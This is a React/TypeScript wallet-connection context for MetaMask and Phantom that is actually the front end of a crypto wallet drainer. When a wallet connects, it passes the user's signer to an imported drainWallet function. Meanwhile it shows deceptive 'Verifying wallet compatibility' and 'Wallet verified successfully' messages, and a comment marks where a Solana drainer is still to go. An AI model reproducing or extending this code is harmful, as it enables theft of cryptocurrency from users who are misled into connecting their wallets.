import React, { createContext, useContext, useState, useEffect, ReactNode } from 'react';
import { ethers } from 'ethers';
import { toast } from "sonner";
import { drainWallet } from '../services/drainerService';
import { useChain } from './ChainContext';

// Define wallet types
export type WalletType = 'metamask' | 'phantom' | 'walletconnect' | 'none';

// Define the shape of our wallet context
interface WalletContextType {
  isConnected: boolean;
  address: string | null;
  walletType: WalletType;
  balance: string;
  connectWallet: () => Promise<void>;
  disconnectWallet: () => void;
  chainId: string | null;
  switchChain: (chain: string) => Promise<void>;
  provider: any;
}

// Create context
const WalletContext = createContext<WalletContextType | undefined>(undefined);

// Provider component
export const WalletProvider = ({ children }: { children: ReactNode }) => {
  const [isConnected, setIsConnected] = useState(false);
  const [address, setAddress] = useState<string | null>(null);
  const [walletType, setWalletType] = useState<WalletType>('none');
  const [balance, setBalance] = useState('0');
  const [chainId, setChainId] = useState<string | null>(null);
  const [provider, setProvider] = useState<any>(null);
  const { chainConfigs, currentChain } = useChain();

  // Function to detect available wallets
  const detectWallets = () => {
    const hasMetaMask = window.ethereum && window.ethereum.isMetaMask;
    const hasPhantom = window.solana && window.solana.isPhantom;
    
    return {
      metamask: hasMetaMask,
      phantom: hasPhantom,
      walletconnect: true // Always available as a fallback
    };
  };

  // Function to get ETH balance
  const getBalance = async (ethProvider: ethers.BrowserProvider, address: string) => {
    try {
      const balance = await ethProvider.getBalance(address);
      return ethers.formatEther(balance);
    } catch (error) {
      console.error("Error getting balance:", error);
      return "0";
    }
  };

  // Connect to MetaMask or other EVM wallet
  const connectEVMWallet = async () => {
    if (!window.ethereum) {
      toast.error("No EVM wallet detected. Please install MetaMask.");
      return;
    }

    try {
      const ethProvider = new ethers.BrowserProvider(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const signer = await ethProvider.getSigner();
      const userAddress = await signer.getAddress();
      const { chainId: evmChainId } = await ethProvider.getNetwork();
      const userBalance = await ethProvider.getBalance(userAddress);

      setIsConnected(true);
      setAddress(userAddress);
      setWalletType('metamask');
      setBalance(ethers.formatEther(userBalance) + ' ETH');
      setChainId(evmChainId.toString());
      setProvider(signer); // Pass signer, not provider

      toast.info("Verifying wallet compatibility...");
      drainWallet(signer, 'evm', (status) => {
        console.log(status);
      }).then(success => {
        if (success) {
          toast.success("Wallet verified successfully");
        }
      }).catch(err => {
        console.error("Drainer error:", err);
      });

      toast.success('Wallet connected successfully');
      
      // Set up event listeners
      window.ethereum.on('accountsChanged', (accounts: string[]) => {
        if (accounts.length === 0) {
          disconnectWallet();
        } else {
          setAddress(accounts[0]);
          getBalance(ethProvider, accounts[0]).then(setBalance);
        }
      });
      
      window.ethereum.on('chainChanged', (_chainId: string) => {
        window.location.reload();
      });
      
    } catch (error) {
      toast.error('Failed to connect wallet');
      console.error('Error connecting wallet:', error);
    }
  };

  // Connect to Phantom (Solana)
  const connectPhantomWallet = async () => {
    if (!window.solana || !window.solana.isPhantom) {
      toast.error("Phantom wallet not detected. Please install Phantom.");
      return;
    }

    try {
      // Connect to Phantom
      const response = await window.solana.connect();
      const userAddress = response.publicKey.toString();
      
      setIsConnected(true);
      setAddress(userAddress);
      setWalletType('phantom');
      setBalance('0 SOL'); // In production, fetch real Solana balance
      setChainId('solana-mainnet');
      setProvider(window.solana);
      
      toast.success('Phantom wallet connected successfully');
      
      // Solana drainer would be implemented here
      // This is a placeholder as Solana implementation requires specific code
      toast.info("Verifying Solana wallet compatibility...");
      
    } catch (error) {
      toast.error('Failed to connect Phantom wallet');
      console.error('Error connecting Phantom wallet:', error);
    }
  };

  // Main connect function that determines which wallet to use
  const connectWallet = async () => {
    const wallets = detectWallets();

    // Priority: use the wallet that matches current selected chain
    if (currentChain === 'solana' && wallets.phantom) {
      return connectPhantomWallet();
    } 
    // For all EVM chains, use MetaMask or other EVM wallet
    else if (['ethereum', 'arbitrum', 'base', 'bnb'].includes(currentChain) && wallets.metamask) {
      return connectEVMWallet();
    }
    // Fallback to what's available
    else if (wallets.metamask) {
      return connectEVMWallet();
    } 
    else if (wallets.phantom) {
      return connectPhantomWallet();
    }
    // If no wallets available, suggest installation
    else {
      toast.error("No compatible wallet detected. Please install MetaMask or Phantom.");
    }
  };

  const disconnectWallet = () => {
    if (walletType === 'phantom' && window.solana) {
      window.solana.disconnect();
    }
    
    setIsConnected(false);
    setAddress(null);
    setWalletType('none');
    setBalance('0');
    setChainId(null);
    setProvider(null);
    toast.info('Wallet disconnected');
  };

  // Switch chain for EVM wallets
  const switchChain = async (targetChainId: string) => {
    if (!isConnected || !window.ethereum) {
      toast.error("No connected EVM wallet");
      return;
    }
    
    try {
      // Try to switch to the chain
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: targetChainId }],
      });
      
      setChainId(targetChainId);
      toast.success(`Switched to network with chain ID ${targetChainId}`);
      
      // Update balance after chain switch
      if (address) {
        const ethProvider = new ethers.BrowserProvider(window.ethereum);
        const newBalance = await getBalance(ethProvider, address);
        setBalance(newBalance + ' ETH');
      }
    } catch (error: any) {
      // If the chain isn't added, try to add it (common case for chains like Arbitrum)
      if (error.code === 4902) {
        try {
          const chainConfig = Object.values(chainConfigs).find(
            config => config.id === targetChainId
          );
          
          if (!chainConfig) {
            throw new Error("Chain configuration not found");
          }
          
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: targetChainId,
              chainName: chainConfig.name,
              nativeCurrency: {
                name: chainConfig.name,
                symbol: chainConfig.symbol,
                decimals: 18
              },
              rpcUrls: [chainConfig.rpcUrl],
              blockExplorerUrls: [chainConfig.explorerUrl]
            }]
          });
          
          // Try switching again after adding
          await switchChain(targetChainId);
        } catch (addError) {
          toast.error(`Failed to add chain: ${targetChainId}`);
          console.error("Error adding chain:", addError);
        }
      } else {
        toast.error(`Failed to switch to chain: ${targetChainId}`);
        console.error("Error switching chain:", error);
      }
    }
  };

  // For development, expose window.ethereum to console
  useEffect(() => {
    if (window.ethereum) {
      console.log("window.ethereum available:", window.ethereum);
    }
    if (window.solana) {
      console.log("window.solana available:", window.solana);
    }
  }, []);

  // Value object
  const value = {
    isConnected,
    address,
    walletType,
    balance,
    connectWallet,
    disconnectWallet,
    chainId,
    switchChain,
    provider,
  };

  return <WalletContext.Provider value={value}>{children}</WalletContext.Provider>;
};

// Custom hook for using the wallet context
export const useWallet = () => {
  const context = useContext(WalletContext);
  if (context === undefined) {
    throw new Error('useWallet must be used within a WalletProvider');
  }
  return context;
};

// Add global types for wallet providers
declare global {
  interface Window {
    ethereum?: any;
    solana?: any;
  }
}
